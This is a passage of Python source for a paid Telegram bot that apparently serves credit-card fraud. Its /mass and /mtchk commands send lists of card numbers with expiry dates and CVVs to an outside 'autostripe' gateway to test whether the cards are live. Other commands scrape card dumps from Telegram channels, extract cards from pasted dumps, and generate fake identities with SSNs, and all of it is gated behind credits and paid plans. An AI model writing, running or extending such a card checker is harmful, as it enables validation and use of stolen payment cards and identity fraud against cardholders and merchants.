        '𝐚':'a','𝐛':'b','𝐜':'c','𝐝':'d','𝐞':'e','𝐟':'f','𝐠':'g','𝐡':'h','𝐢':'i','𝐣':'j',
        '𝐤':'k','𝐥':'l','𝐦':'m','𝐧':'n','𝐨':'o','𝐩':'p','𝐪':'q','𝐫':'r','𝐬':'s','𝐭':'t',
        '𝐮':'u','𝐯':'v','𝐰':'w','𝐱':'x','𝐲':'y','𝐳':'z',
        '𝗔':'A','𝗕':'B','𝗖':'C','𝗗':'D','𝗘':'E','𝗙':'F','𝗚':'G','𝗛':'H','𝗜':'I','𝗝':'J',
        '𝗞':'K','𝗟':'L','𝗠':'M','𝗡':'N','𝗢':'O','𝗣':'P','𝗤':'Q','𝗥':'R','𝗦':'S','𝗧':'T',
        '𝗨':'U','𝗩':'V','𝗪':'W','𝗫':'X','𝗬':'Y','𝗭':'Z',
        '𝗮':'a','𝗯':'b','𝗰':'c','𝗱':'d','𝗲':'e','𝗳':'f','𝗴':'g','𝗵':'h','𝗶':'i','𝗷':'j',
        '𝗸':'k','𝗹':'l','𝗺':'m','𝗻':'n','𝗼':'o','𝗽':'p','𝗾':'q','𝗿':'r','𝘀':'s','𝘁':'t',
        '𝘂':'u','𝘃':'v','𝘄':'w','𝘅':'x','𝘆':'y','𝘇':'z',
        '𝟑':'3',
        '𝑨':'A', '𝒑':'p', '𝒓':'r', '𝒐':'o', '𝒗':'v', '𝒆':'e', '𝒅':'d', '✅':'', '❌':''
    }
    
    normalized_string = ""
    for char in status:
        normalized_string += character_map.get(char, char)
    return normalized_string

# --- CARD CHECKER LOGIC ---
async def check_cards_background(cards_to_check, user_id, user_first_name, processing_msg, start_time):
    """
    Asynchronously checks a list of credit cards and updates a Telegram message with the progress.
    This function is designed to run as a background task.
    """
    approved_count = declined_count = checked_count = error_count = 0
    results = []
    total_cards = len(cards_to_check)

    # Check user credits
    user_data = await get_user(user_id)
    if not user_data or user_data.get('credits', 0) <= 0:
        await processing_msg.edit_text("❌ You don’t have enough credits.")
        return

    semaphore = asyncio.Semaphore(2)  # Limit concurrent requests to 10

    async with aiohttp.ClientSession() as session:
        async def fetch_card(card):
            """Fetches the status of a single card from the API."""
            nonlocal error_count
            async with semaphore:
                # The API URL is a placeholder.
                api_url = f"https://kalinuxx.onrender.com/gateway=autostripe?key=k4linuxx&card={card}"
                try:
                    async with session.get(api_url, timeout=45) as resp:
                        data = await resp.json()
                        status = data.get("status", "Unknown ❓")
                except Exception as e:
                    # Catch network and JSON parsing errors
                    status = f"❌ API Error: {str(e)}"
                    error_count += 1
                return card, status

        tasks = [fetch_card(card) for card in cards_to_check]

        for coro in asyncio.as_completed(tasks):
            raw, status = await coro
            
            # Normalize the status string using the new helper function
            normalized_status = normalize_status_string(status)

            # Count statuses by checking for the specific, stylized substrings
            if "approved" in normalized_status.lower():
                approved_count += 1
            elif "card declined" in normalized_status.lower():
                declined_count += 1
            checked_count += 1

            # Escape dynamic content for MarkdownV2
            raw_safe = escape_markdown(raw, version=2)
            status_safe = escape_markdown(status, version=2)
            # Append the formatted card string to the results list
            results.append(f"`{raw_safe}`\n𝐒𝐭𝐚𝐭𝐮𝐬 ➳ {status_safe}")

            # Update progress after each card is checked
            current_time_taken = round(time.time() - start_time, 2)
            
            summary = (
                f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
                f"✘ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣{checked_count}\n"
                f"✘ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{approved_count}\n"
                f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined_count}\n"
                f"✘ 𝐄𝐫𝐫𝐨𝐫↣{error_count}\n"
                f"✘ 𝐓𝐢𝐦𝐞↣{current_time_taken}s\n"
                f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n"
                f"──────── ⸙ ─────────"
            )
            
            try:
                # Join all results with the separator for the intermediate update
                await processing_msg.edit_text(
                    escape_markdown(summary, version=2) + "\n\n" + "\n──────── ⸙ ─────────\n".join(results) + "\n──────── ⸙ ─────────",
                    parse_mode=ParseMode.MARKDOWN_V2
                )
            except Exception:
                # Ignore Telegram errors for partial updates (e.g., if message is unchanged)
                pass

            # Wait for 3 seconds before checking the next card
            await asyncio.sleep(3)

    # Final message is already in the correct format, no change needed
    final_time_taken = round(time.time() - start_time, 2)
    final_summary = (
        f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
        f"✘ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣{checked_count}\n"
        f"✘ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{approved_count}\n"
        f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined_count}\n"
        f"✘ 𝐄𝐫𝐫𝐨𝐫↣{error_count}\n"
        f"✘ 𝐓𝐢𝐦𝐞↣{final_time_taken}s\n"
        f"\n𝗠𝗮𝘀𝐬 𝗖𝗵𝗲𝗰𝗸\n"
        f"──────── ⸙ ─────────"
    )
    await processing_msg.edit_text(
        escape_markdown(final_summary, version=2) + "\n\n" + "\n──────── ⸙ ─────────\n".join(results) + "\n──────── ⸙ ─────────",
        parse_mode=ParseMode.MARKDOWN_V2
    )


# --- /mass command handler ---
import asyncio
import time
import re
from telegram import Update
from telegram.ext import ContextTypes

# Make sure these imports exist in your project


async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Handles the /mass command to initiate a card check.
    Requires authorization (paid plan or authorized group).
    Does NOT consume credits.
    """

    user = update.effective_user
    user_id = user.id

    # ✅ Cooldown check
    if not await enforce_cooldown(user_id, update):
        return

    # ✅ Authorization check (owner, paid, or free group)
    if not await check_authorization(update, context):
        return

    # ✅ Extract cards from args or replied message
    raw_cards = ""
    if context.args:
        raw_cards = " ".join(context.args)
    elif (
        update.effective_message.reply_to_message
        and update.effective_message.reply_to_message.text
    ):
        raw_cards = update.effective_message.reply_to_message.text

    if not raw_cards:
        await update.effective_message.reply_text(
            "⚠️ Usage:\n"
            "Reply to a message containing cards OR use:\n"
            "`/mass number|mm|yy|cvv`",
            parse_mode="Markdown",
        )
        return

    # ✅ Regex to extract card patterns
    card_pattern = re.compile(
        r"(\d{13,16}\|\d{1,2}\|(?:\d{2}|\d{4})\|\d{3,4})"
    )
    card_lines = card_pattern.findall(raw_cards)

    if not card_lines:
        await update.effective_message.reply_text(
            "⚠️ No valid cards found.\nFormat: `number|mm|yy|cvv`",
            parse_mode="Markdown",
        )
        return

    # ✅ Normalize cards (limit to 30, fix yyyy → yy)
    cards_to_check = []
    for raw in card_lines[:30]:
        parts = raw.split("|")
        if len(parts) != 4:
            continue
        if len(parts[2]) == 4:  # convert yyyy → yy
            parts[2] = parts[2][-2:]
        cards_to_check.append("|".join(parts))

    if len(card_lines) > 30:
        await update.effective_message.reply_text(
            "⚠️ Only the first 30 cards will be processed."
        )

    # ✅ Send initial processing message
    processing_msg = await update.effective_message.reply_text(
        f"🔎 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 {len(cards_to_check)} 𝑪𝒂𝒓𝒅𝒔..."
    )
    start_time = time.time()

    # ✅ Launch background task for checking
    asyncio.create_task(
        check_cards_background(
            cards_to_check,
            user_id,
            user.first_name,
            processing_msg,
            start_time,
        )
    )

    

import time
from datetime import datetime
from telegram import Update
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown

from db import get_user, update_user  # Your DB functions
from config import AUTHORIZED_CHATS   # ✅ Add your group IDs here

OWNER_ID = 8438505794
user_cooldowns = {}

# ─── Authorization & Access for /mtchk ──────────────────────
async def check_mtchk_access(user_id: int, chat, update: Update) -> bool:
    """
    ✅ In authorized groups → allow all users (must have credits).
    ✅ In private chats → require paid plan + credits.
    👑 Owner bypasses everything.
    """
    # 👑 Owner bypass
    if user_id == OWNER_ID:
        return True

    # 📂 Get user data
    user_data = await get_user(user_id)
    if not user_data:
        await update.effective_message.reply_text(
            "❌ You are not registered or have no active plan.",
            parse_mode=ParseMode.MARKDOWN
        )
        return False

    credits = user_data.get("credits", 0)

    # 👥 Group logic → only credits required
    if chat.type in ["group", "supergroup"] and chat.id in AUTHORIZED_CHATS:
        if credits <= 0:
            await update.effective_message.reply_text(
                "❌ You don't have enough credits to run this command.",
                parse_mode=ParseMode.MARKDOWN
            )
            return False
        return True

    # 💬 Private chat logic → must be paid plan + credits
    plan = user_data.get("plan", "Free")

    if plan.lower() == "free":
        await update.effective_message.reply_text(
            "🚫 This command is available members having plan.\n"
            "💳 Buy a plan or join our authorized group to use.",
            parse_mode=ParseMode.MARKDOWN
        )
        return False

    expiry = user_data.get("plan_expiry", "N/A")
    if expiry != "N/A":
        try:
            expiry_date = datetime.strptime(expiry, "%d-%m-%Y")
            if expiry_date < datetime.now():
                await update.effective_message.reply_text(
                    "⏳ Your plan has expired. Renew to use this command.",
                    parse_mode=ParseMode.MARKDOWN
                )
                return False
        except Exception:
            pass

    if credits <= 0:
        await update.effective_message.reply_text(
            "❌ You don't have enough credits to run this command.",
            parse_mode=ParseMode.MARKDOWN
        )
        return False

    return True


# ─── Cooldown ──────────────────────────────
user_cooldowns = {}  # { user_id: { "mtchk": timestamp } }

async def enforce_cooldown(user_id: int, update: Update) -> bool:
    cooldown = 5  # seconds
    now = time.time()
    last = user_cooldowns.get(user_id, 0)
    if now - last < cooldown:
        remaining = round(cooldown - (now - last), 2)
        await update.effective_message.reply_text(
            escape_markdown(f"⏳ Cooldown active. Wait {remaining} seconds.", version=2),
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        return False
    user_cooldowns[user_id] = now
    return True




# ─── Credit Consumption ──────────────────────────────
async def consume_credit(user_id: int) -> bool:
    """
    Deduct one credit from the user.
    Returns True if successful, False if no credits left.
    """
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False





# ─── Background Task ──────────────────────────────
import asyncio
import aiohttp
import os
import re
import json
from telegram import Update, InputFile
from telegram.ext import ContextTypes
from telegram.constants import ParseMode

# Assuming these functions are defined elsewhere in your project
# from your_module import check_paid_access, enforce_cooldown

# ─── Utility Function ──────────────────────────────
def normalize_status_text(s: str) -> str:
    """Normalizes various unicode and stylistic characters to standard ASCII and converts to uppercase."""
    mapping = {
        '𝐀':'A','𝐁':'B','𝐂':'C','𝐃':'D','𝐄':'E','𝐅':'F','𝐆':'G','𝐇':'H','𝐈':'I','𝐉':'J',
        '𝐊':'K','𝐋':'L','𝗠':'M','𝐍':'N','𝐎':'O','𝐏':'P','𝐐':'Q','𝐑':'R','𝐒':'S','𝐓':'T',
        '𝐔':'U','𝐕':'V','𝐖':'W','𝐗':'X','𝐘':'Y','𝐙':'Z',
        '𝐚':'a','𝐛':'b','𝐜':'c','𝐝':'d','𝐞':'e','𝐟':'f','𝐠':'g','𝐡':'h','𝐢':'i','𝐣':'j',
        '𝐤':'k','𝐥':'l','𝐦':'m','𝐧':'n','𝐨':'o','𝐩':'p','𝐪':'q','𝐫':'r','𝐬':'s','𝐭':'t',
        '𝐮':'u','𝐯':'v','𝐰':'w','𝐱':'x','𝐲':'y','𝐳':'z',
        '𝗔':'A','𝗕':'B','𝗖':'C','𝗗':'D','𝗘':'E','𝗙':'F','𝗚':'G','𝗛':'H','𝗜':'I','𝗝':'J',
        '𝗞':'K','𝗟':'L','𝗠':'M','𝗡':'N','𝗢':'O','𝗣':'P','𝗤':'Q','𝗥':'R','𝗦':'S','𝗧':'T',
        '𝗨':'U','𝗩':'𝗩','𝗪':'W','𝗫':'X','𝗬':'Y','𝗭':'Z',
        '𝗮':'a','𝗯':'b','𝗰':'c','𝗱':'d','𝗲':'e','𝗳':'f','𝗴':'g','𝗵':'h','𝗶':'i','𝗷':'j',
        '𝗸':'k','𝗹':'l','𝗺':'m','𝗻':'o','𝗼':'o','𝗽':'p','𝗾':'q','𝗿':'r','𝘀':'s','𝘁':'t',
        '𝘂':'u','𝘃':'v','𝘄':'w','𝘅':'x','𝘆':'y','𝘇':'z',
        '𝟑':'3',
        '𝑨':'A', '✅':'', '❎':'', '❌':'', '❗':''
    }
    s = s.strip()
    return "".join(mapping.get(char, char) for char in s).upper()

# ─── /mtchk Handler ──────────────────────────────
import os
import asyncio
from telegram import Update
from telegram.ext import ContextTypes

async def mtchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat = update.effective_chat

    # ✅ Authorization (group/private logic + credits)
    if not await check_mtchk_access(user_id, chat, update):
        return

    # ✅ Cooldown
    if not await enforce_cooldown(user_id, update):
        return



    # ✅ Deduct 1 credit for this file
    if not await consume_credit(user_id):
        await update.message.reply_text("❌ You don’t have enough credits.")
        return

    
    # ✅ Ensure a .txt file is attached or replied to
    document = update.message.document or (
        update.message.reply_to_message and update.message.reply_to_message.document
    )
    if not document:
        await update.message.reply_text("📂 Please send or reply to a txt file containing up to 200 cards.")
        return

    if not document.file_name.endswith(".txt"):
        await update.message.reply_text("⚠️ Only txt files are supported.")
        return

    # ✅ Download file
    file_path = f"input_cards_{user_id}.txt"
    try:
        file = await context.bot.get_file(document.file_id)
        await file.download_to_drive(custom_path=file_path)
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to download file: {e}")
        return

    # ✅ Read and clean up file
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            cards = [line.strip() for line in f if line.strip()]
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to read file: {e}")
        return
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

    # ✅ Validate card count
    if len(cards) > 50:
        await update.message.reply_text("⚠️ Maximum 50 cards allowed per file.")
        return

    # ✅ Initial progress message
    estimated_time = max(len(cards) / 7, 1)  # assume 10 cards in parallel
    try:
        processing_msg = await update.message.reply_text(
            f"━━ ⚡𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵⚡ ━━\n"
            f"💳𝑻𝒐𝒕𝒂𝒍 𝑪𝒂𝒓𝒅𝒔 ➼ {len(cards)} | ⌚𝐄𝐬𝐭𝐢𝐦𝐚𝐭𝐞𝐝 𝐓𝐢𝐦𝐞 ➼ ~{estimated_time:.0f}s\n"
            f"✦━━━━━━━━━━✦\n"
            f"▌ [□□□□□□□□□□] 0/{len(cards)} ▌\n"
            f"✦━━━━━━━━━━━━━━━━━━━✦"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to send progress message: {e}")
        return

    # ✅ Launch background check
    asyncio.create_task(
        background_check_multi(update, context, cards, processing_msg),
        name=f"mtchk_user_{user_id}"
    )


# ─── Background Task ──────────────────────────────
async def background_check_multi(update, context, cards, processing_msg):
    """
    Performs the background card check and handles all status updates and file output.
    This version processes cards in parallel with robust error handling.
    """
    results = []
    approved = 0
    declined = 0
    ccn_live = 0
    threed = 0
    unknown = 0
    total = len(cards)

    async def escape_md(text):
        special_chars = r'\_*[]()~`>#+-=|{}.!'
        return re.sub(f"([{re.escape(special_chars)}])", r"\\\1", text)

    async def check_card_with_semaphore(session, card, semaphore):
        async with semaphore:
            return await check_card(session, card)

    async def check_card(session, card):
        try:
            async with session.get(
                f"https://kalinuxx.onrender.com/gateway=autostripe?key=k4linuxx&card={card}",
                timeout=45
            ) as resp:
                text_data = await resp.text()

                # Attempt to parse JSON
                try:
                    json_data = json.loads(text_data)
                    status_text = json_data.get("status", "Unknown")
                except (json.JSONDecodeError, KeyError):
                    status_text = text_data.strip()
                
                return card, status_text

        except Exception as e:
            return card, f"Error: {str(e)}"

    async def update_progress(current_count):
        filled_len = round((current_count / total) * 10)
        empty_len = 10 - filled_len
        bar = "■" * filled_len + "□" * empty_len
        
        progress_text = (
            f"━━ ⚡𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵⚡ ━━\n"
            f"💳𝑻𝒐𝒕𝒂𝒍 𝑪𝒂𝒓𝒅𝒔 ➼ {total} | ✅𝐂𝐡𝐞𝐜𝐤𝐞𝐝 ➼ {current_count}/{total}\n"
            f"✦━━━━━━━━━━✦\n"
            f"▌ [{bar}] ▌\n"
            f"✦━━━━━━━━━━━━━━━━━━━✦"
        )
        try:
            await processing_msg.edit_text(await escape_md(progress_text), parse_mode=ParseMode.MARKDOWN_V2)
        except Exception:
            pass

    async with aiohttp.ClientSession() as session:
        semaphore = asyncio.Semaphore(7)
        tasks = [check_card_with_semaphore(session, card, semaphore) for card in cards]

        for i, task in enumerate(asyncio.as_completed(tasks)):
            card, status_text = await task
            
            normalized_status = normalize_status_text(status_text)

            # Check for the specific statuses in order of priority
            if "✅" in status_text:
                approved += 1
            elif "❌" in status_text:
                declined += 1
            elif "CCN LIVE" in normalized_status:  # Prioritize CCN Live check
                ccn_live += 1
            elif "❎" in status_text:  # Check for 3DS only if not CCN Live
                threed += 1
            else:
                unknown += 1
            
            results.append(f"{card} -> {status_text}")
            
            await update_progress(len(results))

    output_filename = "checked.txt"
    with open(output_filename, "w", encoding="utf-8") as f:
        f.write("\n".join(results))

    try:
        await processing_msg.delete()
    except Exception:
        pass

    summary = (
        "✦━━━━ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 ━━━━✦\n" 
        f"📊 𝗧𝗼𝘁𝗮𝗹     » {total}\n"
        f"✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱  » {approved}\n"
        f"❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱  » {declined}\n"
        f"⚠️ 𝟯𝗗𝗦        » {threed}\n"
        f"💳 𝗖𝗖𝗡 𝗟𝗶𝘃𝗲  » {ccn_live}\n"
        f"❓ 𝗨𝗻𝗸𝗻𝗼𝘄𝗻    » {unknown}\n"
        "✦━━━━━━━━━━━━━━━━━━━✦"
    )

    try:
        with open(output_filename, "rb") as f:
            await update.message.reply_document(
                document=InputFile(f, filename=output_filename),
                caption=summary
            )
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to send results: {e}")

    try:
        os.remove(output_filename)
    except Exception:
        pass






from faker import Faker
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Replace with your *legit* group/channel link
BULLET_GROUP_LINK = "https://t.me/+9IxcXQ2wO_c0OWQ1"

def escape_markdown_v2(text: str) -> str:
    """Escapes special characters for Telegram MarkdownV2."""
    import re
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))

async def fk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generates fake identity info."""

    # Define the bullet point with the hyperlink
    bullet_link = f"\[[₰]({BULLET_GROUP_LINK})\]"
    
    # Cooldown check
    if not await enforce_cooldown(update.effective_user.id, update):
        return

    user_id = update.effective_user.id
    user_data = await get_user(user_id)

    # Deduct 1 credit if available
    if user_data['credits'] <= 0:
        return await update.effective_message.reply_text(
            "❌ You have no credits left\\. Please get a subscription to use this command\\.",
            parse_mode=ParseMode.MARKDOWN_V2,
            disable_web_page_preview=True
        )
    if not await consume_credit(user_id):
        return await update.effective_message.reply_text(
            "❌ You have no credits left\\. Please get a subscription to use this command\\.",
            parse_mode=ParseMode.MARKDOWN_V2,
            disable_web_page_preview=True
        )

    country_code = context.args[0] if context.args else 'en_US'
    try:
        fake = Faker(country_code)
    except:
        fake = Faker('en_US')

    name = escape_markdown_v2(fake.name())
    dob = escape_markdown_v2(fake.date_of_birth().strftime('%Y-%m-%d'))
    ssn = escape_markdown_v2(fake.ssn())
    email = escape_markdown_v2(fake.email())
    username = escape_markdown_v2(fake.user_name())
    phone = escape_markdown_v2(fake.phone_number())
    job = escape_markdown_v2(fake.job())
    company = escape_markdown_v2(fake.company())
    street = escape_markdown_v2(fake.street_address())
    address2 = escape_markdown_v2(fake.secondary_address())
    city = escape_markdown_v2(fake.city())
    state = escape_markdown_v2(fake.state())
    zip_code = escape_markdown_v2(fake.zipcode())
    country = escape_markdown_v2(fake.country())
    ip = escape_markdown_v2(fake.ipv4_public())
    ua = escape_markdown_v2(fake.user_agent())

    output = (
        "╭━━━[ 🧑‍💻 𝙁𝙖𝙠𝙚 𝙄𝙣𝙛𝙤 ]━━━━⬣\n"
        f"{bullet_link} 𝙉𝙖𝙢𝙚 ➳ `{name}`\n"
        f"{bullet_link} 𝘿𝙤𝘽 ➳ `{dob}`\n"
        f"{bullet_link} 𝙎𝙎𝙉 ➳ `{ssn}`\n"
        f"{bullet_link} 𝙀�𝙖𝙞𝙡 ➳ `{email}`\n"
        f"{bullet_link} 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 ➳ `{username}`\n"
        f"{bullet_link} 𝙋𝙝𝙤𝙣𝙚 ➳ `{phone}`\n"
        f"{bullet_link} 𝙅𝙤𝙗 ➳ `{job}`\n"
        f"{bullet_link} 𝘾𝙤𝙢𝙥𝙖𝙣𝙮 ➳ `{company}`\n"
        f"{bullet_link} 𝙎𝙩𝙧𝙚𝙚𝙩 ➳ `{street}`\n"
        f"{bullet_link} 𝘼𝙙𝙙𝙧𝙚𝙨𝙨 2 ➳ `{address2}`\n"
        f"{bullet_link} 𝘾𝙞𝙩𝙮 ➳ `{city}`\n"
        f"{bullet_link} 𝙎𝙩𝙖𝙩𝙚 ➳ `{state}`\n"
        f"{bullet_link} 𝙕𝙞𝙥 ➳ `{zip_code}`\n"
        f"{bullet_link} 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➳ `{country}`\n"
        f"{bullet_link} 𝙄𝙋 ➳ `{ip}`\n"
        f"{bullet_link} 𝙐𝘼 ➳ `{ua}`\n"
        "╰━━━━━━━━━━━━━━━━━━⬣"
    )

    await update.effective_message.reply_text(
        output,
        parse_mode=ParseMode.MARKDOWN_V2,
        disable_web_page_preview=True
    )



import re
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Escape function for MarkdownV2
def escape_markdown_v2(text: str) -> str:
    """Escapes special characters for Telegram MarkdownV2."""
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))

async def fl_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Extracts all cards from a dump (message or reply)."""

    user_id = update.effective_user.id
    user_data = await get_user(user_id)

    # Check credits
    if user_data.get('credits', 0) <= 0:
        return await update.effective_message.reply_text(
            "❌ You have no credits left\\. Please get a subscription to use this command\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Determine input text
    if update.message.reply_to_message and update.message.reply_to_message.text:
        dump = update.message.reply_to_message.text
    elif context.args:
        dump = " ".join(context.args)
    else:
        return await update.effective_message.reply_text(
            "❌ Please provide or reply to a dump containing cards\\. Usage: `/fl <dump or reply>`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Deduct credit
    if not await consume_credit(user_id):
        return await update.effective_message.reply_text(
            "❌ You have no credits left\\. Please get a subscription to use this command\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Regex to find cards: number|mm|yy|cvv (cvv 3 or 4 digits, year 2 or 4 digits)
    card_pattern = re.compile(
        r"\b(\d{13,16})\|(\d{1,2})\|(\d{2}|\d{4})\|(\d{3,4})\b"
    )
    cards_found = ["{}|{}|{}|{}".format(m[0], m[1].zfill(2), m[2][-2:], m[3]) for m in card_pattern.findall(dump)]
    count = len(cards_found)

    if cards_found:
        # Each card in monospace with proper escaping
        extracted_cards_text = "\n".join([f"`{escape_markdown_v2(card)}`" for card in cards_found])
    else:
        extracted_cards_text = "_No cards found in the provided text\\._"

    msg = (
        f"╭━━━ [ 💳 𝗘𝘅𝘁𝗿𝗮𝗰𝘁𝗲𝗱 𝗖𝗮𝗿𝗱𝘀 ] ━━━⬣\n"
        f"┣ ❏ Total ➳ {count}\n"
        f"╰━━━━━━━━━━━━━━━━━━━━⬣\n\n"
        f"{extracted_cards_text}"
    )

    await update.effective_message.reply_text(msg, parse_mode=ParseMode.MARKDOWN_V2)


import asyncio
from datetime import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from pyrogram import Client

# ----------------- Pyrogram Setup -----------------
api_id = 'YOUR_API_ID'      # Replace with your API ID
api_hash = 'YOUR_API_HASH'  # Replace with your API Hash
pyro_client = Client("scraper_session", api_id=api_id, api_hash=api_hash)

# ----------------- Cooldown -----------------
user_last_scr_time = {}
COOLDOWN_SECONDS = 5  # Minimum seconds between /scr uses

# ----------------- Dummy DB Functions -----------------
# Replace with your real DB logic
async def consume_credit(user_id):
    # Deduct 1 credit per command
    return True

# ----------------- /scr Command -----------------
async def scrap_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    now = datetime.now()

    # Check cooldown
    last_time = user_last_scr_time.get(user_id)
    if last_time and (now - last_time).total_seconds() < COOLDOWN_SECONDS:
        await update.message.reply_text(
            f"⚠️ Please wait {COOLDOWN_SECONDS} seconds between /scr commands."
        )
        return

    # Consume credit
    if not await consume_credit(user_id):
        await update.message.reply_text("❌ You don't have enough credits to run this command.")
        return

    # Parse arguments
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /scr [public_channel_username] [amount]")
        return

    channel = context.args[0].lstrip("@")
    try:
        amount = int(context.args[1])
    except ValueError:
        await update.message.reply_text("Amount must be a number.")
        return

    # Update cooldown
    user_last_scr_time[user_id] = now

    await update.message.reply_text(f"⏳ Scraping {amount} cards from @{channel} in background...")
    asyncio.create_task(scrap_cards_background(update, channel, amount))


# ----------------- Background Scraping -----------------
async def scrap_cards_background(update: Update, channel: str, amount: int):
    user_id = update.effective_user.id
    cards = []

    try:
        async with pyro_client:
            async for msg in pyro_client.get_chat_history(channel, limit=amount*5):
                if msg.text:
                    for line in msg.text.split("\n"):
                        parts = line.strip().split("|")
                        # Accept formats: card|mm|yy or card|mm|yyyy
                        if len(parts) == 4 and all(parts):
                            cards.append(line.strip())
                        if len(cards) >= amount:
                            break
                if len(cards) >= amount:
                    break
                await asyncio.sleep(5)  # 5-second delay per message

        if not cards:
            await update.message.reply_text("No valid cards found.")
            return

        filename = f"scraped_cards_{user_id}.txt"
        with open(filename, "w") as f:
            f.write("\n".join(cards[:amount]))

        await update.message.reply_document(filename)

    except Exception as e:
        await update.message.reply_text(f"Error: {e}")



import psutil
from telegram.constants import ParseMode
from telegram import Update
from telegram.ext import ContextTypes

async def get_total_users():
    from db import get_all_users
    users = await get_all_users()
    return len(users)  # Return only the count

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # System stats
    cpu_usage = psutil.cpu_percent(interval=1)
    memory_info = psutil.virtual_memory()
    total_memory = memory_info.total / (1024 ** 2)  # MB
    memory_percent = memory_info.percent
    total_users = await get_total_users()

    # Wrap all values in monospace using backticks
    cpu_str = f"`{cpu_usage}%`"
    mem_str = f"`{memory_percent}%`"
    total_mem_str = f"`{total_memory:.2f} MB`"
    users_str = f"`{total_users}`"

    # Status message
    status_message = (
        "╭━━━ 𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐮𝖘 ━━━━⬣\n"
        f"┣ ❏ 𝖢𝖯𝖴 𝖴𝗌𝖺𝗀𝖾 ➳ {cpu_str}\n"
        f"┣ ❏ 𝖱𝖠𝖬 𝖴𝗌𝖺𝗀𝖾 ➳ {mem_str}\n"
        f"┣ ❏ 𝖳𝗈𝗍𝖺𝗅 𝖱𝖠𝖬 ➳ {total_mem_str}\n"
        f"┣ ❏ 𝖳𝗈𝗍𝖺𝗅 𝖴𝗌𝖾𝗋𝗌 ➳ {users_str}\n"
        "╰━━━━━━━━━━━━━━━━━━━⬣"
    )

    await update.effective_message.reply_text(
        status_message,
        parse_mode=ParseMode.MARKDOWN_V2
    )




# === OWNER-ONLY COMMANDS ===
import re
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

from config import AUTHORIZED_CHATS
from db import get_all_users  # Ensure this exists in db.py

def escape_markdown_v2(text: str) -> str:
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shows all admin commands, authorized groups, and private plan users."""

    admin_commands_list = (
        "• `/give_starter <user_id>`: Give 7\\-day Starter Plan\n"
        "• `/give_premium <user_id>`: Give 30\\-day Premium Plan\n"
        "• `/give_plus <user_id>`: Give 60\\-day Plus Plan\n"
        "• `/give_custom <user_id>`: Give Custom Plan\n"
        "• `/take_plan <user_id>`: Remove plan & private access\n"
        "• `/au <chat_id>`: Authorize a group\n"
        "• `/rauth <user_id>`: Remove private user auth\n"
        "• `/gen_codes`: Generate 10 Starter Plan codes"
    )

    # Authorized Groups
    authorized_groups_list = []
    for chat_id in AUTHORIZED_CHATS:
        try:
            chat = await context.bot.get_chat(chat_id)
            name = escape_markdown_v2(chat.title or "N/A")
        except Exception:
            name = "Unknown or Left Group"
        escaped_id = escape_markdown_v2(str(chat_id))
        authorized_groups_list.append(f"• `{escaped_id}` → *{name}*")
    authorized_groups_str = (
        "\n".join(authorized_groups_list) if authorized_groups_list else "_No groups authorized\\._"
    )

    # Private plan users
    users = await get_all_users()
    plan_users = []
    for user in users:
        plan = user.get("plan", "Free")
        if plan.lower() not in ["free", "n/a"]:
            uid = escape_markdown_v2(str(user["id"]))
            plan_escaped = escape_markdown_v2(plan)
            plan_users.append(f"• ID: `{uid}` \\| Plan: `{plan_escaped}`")
    authorized_users_str = (
        "\n".join(plan_users) if plan_users else "_No private users with plans\\._"
    )

    admin_dashboard_message = (
        "╭━━━━━『 𝐀𝐃𝐌𝐈𝐍 𝐃𝐀𝐒𝐇𝐁𝐎𝐀𝐑𝐃 』━━━━━╮\n"
        "┣ 🤖 *Owner Commands:*\n"
        f"{admin_commands_list}\n"
